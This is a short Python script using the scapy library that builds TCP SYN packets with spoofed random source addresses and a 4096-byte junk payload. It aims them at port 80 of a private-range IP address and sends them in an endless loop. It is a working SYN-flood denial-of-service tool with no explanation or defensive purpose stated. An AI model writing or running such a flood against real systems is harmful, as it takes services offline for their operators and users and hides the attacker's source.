from scapy.all import *
from scapy.layers.inet import IP,TCP
import random
import os
import sys

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1000,9000)
	return x	

target_ip = "172.16.127.128"
target_port = 80

ip = IP(dst=target_ip,src=randomIP())
tcp = TCP(sport=RandShort(),dport=target_port, flags="S",seq=RandShort(),window=RandShort())
Raw = raw(b'X'*4096)
p = ip / tcp /Raw

send(p, loop=1, verbose=0)
